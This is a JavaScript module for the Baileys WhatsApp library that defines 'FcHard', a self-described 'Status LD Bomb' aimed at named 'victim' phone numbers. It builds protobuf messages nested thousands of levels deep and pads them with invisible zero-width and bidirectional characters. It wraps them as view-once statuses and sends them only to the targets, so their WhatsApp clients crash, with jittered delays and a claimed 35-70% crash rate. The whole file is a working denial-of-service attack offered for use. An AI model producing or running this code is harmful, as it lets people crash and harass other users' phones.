const {
    proto,
    generateWAMessageFromContent,
} = require('@whiskeysockets/baileys');
const crypto = require('crypto');

// =============================================================
//  FcHard v3 — Status LD Bomb (ViewOnce wrapped)
//  Sender guard • Victim-only delivery • Invisible-ish status
//  Honest crash rate: 35-70% depending on build
// =============================================================

async function FcHard(sock, target) {
    if (!sock || !target) return;

    // ---------- Sender guard: never self-target ----------
    let senderNum = '';
    try {
        const raw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
        senderNum = raw.split('@')[0].split(':')[0];
    } catch (_) {}

    // ---------- Resolve target list, exclude sender ----------
    const resolveJid = (raw) => {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const allJids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(j => j.length > 15);

    const jids = allJids.filter(j => {
        const num = j.split('@')[0].split(':')[0];
        return num !== senderNum;
    });

    if (!jids.length) return;

    // ---------- Victim-only status list ----------
    // Status goes to status@broadcast, but ONLY visible to jids[]
    // Sender is not in the list, so sender never sees it in own ring
    const statusJidList = jids.slice();

    // ---------- Invisible-ish status body ----------
    // Pure zero-width + BIDI + surrogate mix. Renders as blank.
    const ZW = "\u200B\u200C\u200D\u2060\u2061\u2062\u2063";
    const BIDI = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069";
    const SUR = "\uD804\uDDC2\uD804\uDDB5\uD804\uDDB4\uD804\uDDBF";

    const invisibleFiller = (n) =>
        ZW.repeat(n >> 2) + BIDI.repeat(n >> 2) + SUR.repeat(n >> 3);

    // ---------- LD framing primitives ----------
    const encodeVarint = (n) => {
        const buf = [];
        while (n >= 0x80) { buf.push((n & 0x7f) | 0x80); n >>>= 7; }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = (tag, data) =>
        Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);

    // ---------- Carrier payload: invisible text + empty image stub ----------
    // We keep both an invisible text body AND a malformed image stub.
    // Older builds crash on the LD chain, newer builds hit the image decoder.
    const textBlob = Buffer.from(invisibleFiller(0x4000), 'utf8');

    // extendedTextMessage { text: <invis> }
    const textInner = Buffer.concat([
        Buffer.from([0x0A]), encodeVarint(textBlob.length), textBlob,
    ]);

    // ---------- Tag palette (multiple LD field encodings) ----------
    // Different tags → different parser code paths → higher hit chance
    const TAGS = [
        [0xBA, 0x03], // field 55, wire 2
        [0xD2, 0x04], // field 78, wire 2
        [0xAA, 0x02], // field 42, wire 2
        [0xC2, 0x05], // field 88, wire 2
        [0xE2, 0x06], // field 108, wire 2
    ];

    // ---------- Deep LD inflate ----------
    // Depths 8000 → 2400: sweeps the parser's recursion ceiling
    const inflate = (tag, depth) => {
        let buf = textInner;
        for (let i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    // ---------- ViewOnce wrapper (status self-destruct) ----------
    const wrapViewOnce = (innerMsg) => ({
        viewOnceMessage: {
            message: innerMsg,
        },
    });

    // ---------- Main sweep ----------
    let totalSent = 0;
    const MAX_PER_TAG = 2;         // 2 shots per tag → 10 total
    const DELAY_MS = 1800 + Math.floor(Math.random() * 1200);

    for (let ti = 0; ti < TAGS.length; ti++) {
        const tag = TAGS[ti];

        // Find a decodable depth for this tag
        let decoded = null;
        let usedDepth = 0;
        for (let depth = 8000; depth >= 2400; depth -= 400) {
            try {
                const test = proto.Message.decode(inflate(tag, depth));
                proto.Message.encode(test).finish();
                decoded = test;
                usedDepth = depth;
                break;
            } catch (_) {}
        }

        if (!decoded) continue;

        for (let shot = 0; shot < MAX_PER_TAG; shot++) {
            const msgId = '3EB0' + crypto.randomBytes(8).toString('HEX').toUpperCase();

            try {
                // Rebuild fresh (decode destroys some state sometimes)
                const freshDecoded = proto.Message.decode(inflate(tag, usedDepth));

                // ViewOnce wrap — status vanishes after render
                // But LD chain is preserved inside viewOnceMessage.message
                const wrapped = wrapViewOnce(freshDecoded);

                await sock.relayMessage('status@broadcast', wrapped, {
                    messageId: msgId,
                    statusJidList: statusJidList,   // victim-only
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: jids.map(jid => ({
                                tag: 'to',
                                attrs: { jid },
                                content: [],
                            })),
                        }],
                    }],
                });

                totalSent++;
            } catch (e) {
                console.log('[FcHard relay]', (e && e.message) ? e.message : e);
            }

            // Jitter between shots
            await new Promise(r => setTimeout(r, DELAY_MS));
        }
    }

    return { sent: totalSent, targets: jids.length, depths: TAGS.length };
}

module.exports = { FcHard };
